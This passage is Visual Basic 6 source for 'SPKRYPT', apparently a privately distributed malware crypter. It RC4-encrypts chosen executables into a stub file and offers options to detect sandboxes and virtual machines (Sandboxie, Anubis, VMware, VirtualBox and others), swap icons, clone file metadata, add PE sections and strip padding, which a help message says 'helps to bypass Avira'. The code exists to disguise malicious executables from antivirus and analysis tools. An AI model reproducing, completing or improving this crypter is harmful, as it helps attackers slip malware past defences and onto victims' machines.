        With SaveDialog
        On Error Resume Next
        .CancelError = True
        .DefaultExt = ".exe"
        .Filter = "Executables Files (*.exe)|*.exe|SCR Files (*.scr)|*.scr|COM Files (*.com)|*.com|BAT Files (*.bat)|*.bat|PIF Files (*.pif)|*.pif|"
        .FileName = "Encrypted.exe"
        .ShowSave
        End With

        '/==== Custom Stub ====/
        If chkStub.Value = xtpChecked Then
        PathStub = StubDialog.FileName
        Else
        PathStub = App.Path & "\Stub.exe"
        End If
        Open PathStub For Binary As #1
        StubString = Space(LOF(1))
        Get #1, , StubString
        Close #1


        '/==== Get all files in list ====/
        For i = 1 To lvFiles.ListItems.Count
        DoEvents
        Open lvFiles.ListItems(i).Text For Binary As #F
        sBuff(i) = Space(LOF(F))
        Get #F, , sBuff(i)
        Close #F
        Next i
        
       '/==== Checks Anti's and sets data for them ====/
        AntiData = chkSandboxie.Value & "ANTIS" & chkThreatExpert.Value & "ANTIS" & chkAnubis.Value & "ANTIS" & chkCWSandbox.Value & "ANTIS" & chkJoebox.Value & "ANTIS" & chkVMware.Value & "ANTIS" & chkVPC.Value & "ANTIS" & chkVBox.Value & "ANTIS"
      

        

        ' Encrypts the file method 2
        For i = 1 To lvFiles.ListItems.Count
    
        Open SaveDialog.FileName For Binary As #F
        
        Put #F, , StubString & FileSplit
        'Put #F, , AntiData
        Put #F, LOF(F) + 1, FileSplit
        Put #F, , RC4.EncryptString(sBuff(i), "SPKPASS")
        
        Close #F
        
        Next
        

        
        '/ Icon Changer /
        If chkIcon.Value = xtpChecked Then
        Call ChangeIcon(SaveDialog.FileName, txtIcon.Text)
        End If
        
        '/ Clone File /
        If chkClone.Value = xtpChecked Then
        Call CloneFile(SaveDialog.FileName, txtClone.Text)
        End If

        '/ EOF /
        If chkEOF.Value = xtpChecked Then
        sEOF CD.FileName, SaveDialog.FileName
        End If

        '/ Add Sections /
        If chkSections.Value = xtpChecked Then
        Call AddSection(SaveDialog.FileName, txtS1.Text, Len(SaveDialog.FileName), "&H9")
        End If
        
        '/ Remove PADX /
        If chkPADX.Value = xtpChecked Then
        Call AntiPADDING(SaveDialog.FileName)
        End If
        
        ' If RealignPE = Checked /
        If chkRPE.Value = xtpChecked Then
        Call RealignPEFromFile(SaveDialog.FileName)
        End If
        

        
        
        '/ Finish /
        MsgBox "Successfully crypted!"

        

        
End Sub

Private Sub cmdEOFHelp_Click()
        MsgBox "Due to a bug, only the last file you selected's EOF will be extracted.", vbInformation
End Sub

Private Sub cmdExit_Click()
End
Unload Me

End Sub






Private Sub cmdGenKey_Click(Index As Integer)
txtKey.Text = sRandom
End Sub

Private Sub cmdS1_Click(Index As Integer)
txtS1.Text = sRandom2

End Sub

Private Sub cmdHelpRADX_Click()
MsgBox "Removes the PADDINGX on the end of file, which helps to bypass Avira", vbInformation
End Sub

Private Sub s1_Click()
txtS1.Text = "." & sRandom2

End Sub

Private Sub s2_Click()
txtS2.Text = "." & sRandom2
End Sub

Private Sub txtClone_Click()
        '/==== Open the CloneDialog, and set txtClone to ClonePath ====/
        CloneDialog.DefaultExt = ".exe"
        CloneDialog.DialogTitle = "Open File to Clone"
        CloneDialog.Filter = "Executable Files (*.exe)|*.exe"
        CloneDialog.ShowOpen
        '/==== Is the dialog blank, eg. no file selected? ====/
        If CloneDialog.FileName = vbNullString Then Exit Sub
        '/==== Set text of StubPath ====/
        txtClone.Text = CloneDialog.FileName
End Sub

Private Sub txtIcon_Click()
        '/==== Open the IconDialog, and set txtIcon to IconPath ====/
        IconDialog.DefaultExt = ".ico"
        IconDialog.DialogTitle = "Open Icon"
        IconDialog.Filter = "Icons (*.ico)|*.ico"
        IconDialog.ShowOpen
        '/==== Is the dialog blank, eg. no file selected? ====/
        If IconDialog.FileName = vbNullString Then Exit Sub
        '/==== Set text of StubPath ====/
        txtIcon.Text = IconDialog.FileName
End Sub

Private Sub Form_Load()
        '/==== Add columns "Filename" and "EOF" ====/
        lvFiles.ColumnHeaders.Add , , "Filename", 1860
        lvFiles.ColumnHeaders.Add , , "EOF", 600
        lvFiles.ColumnHeaders.Add , , "File Size", 1000
        '/==== Generate a random key on start ====/
        txtKey.Text = sRandom
        txtS1.Text = "." & sRandom2

        '/ Set title to username /
        Me.Caption = "SPKRYPT    |    Private version for: " & frmLogin.txtUser.Text
End Sub


Private Sub txtStub_Click()
        '/==== Open the StubDialog, and set txtStub to StubPath ====/
        StubDialog.DefaultExt = ".exe"
        StubDialog.DialogTitle = "Open PE File"
        StubDialog.Filter = "Executables (*.exe)|*.exe"
        StubDialog.ShowOpen
        '/==== Is the dialog blank, eg. no file selected? ====/
        If StubDialog.FileName = vbNullString Then Exit Sub
        '/==== Set text of StubPath ====/
        txtStub.Text = StubDialog.FileName
End Sub
Public Function sRandom()
        '/==== Generate a random key ====/
        Dim Shitz As String
        Dim i As Integer

        Shitz = L1 + L2 + L3

        For i = 1 To 26
        sRandom = sRandom & Mid$(Shitz, Int((Rnd * Len(Shitz)) + 1), 1)
        Next i
End Function
Public Function sRandom2()
        '/==== Generate a random key for sections====/
        Dim Shitz As String
        Dim i As Integer

        Shitz = L1 + L2

        For i = 1 To 5
        sRandom2 = sRandom2 & Mid$(Shitz, Int((Rnd * Len(Shitz)) + 1), 1)
        Next i
End Function
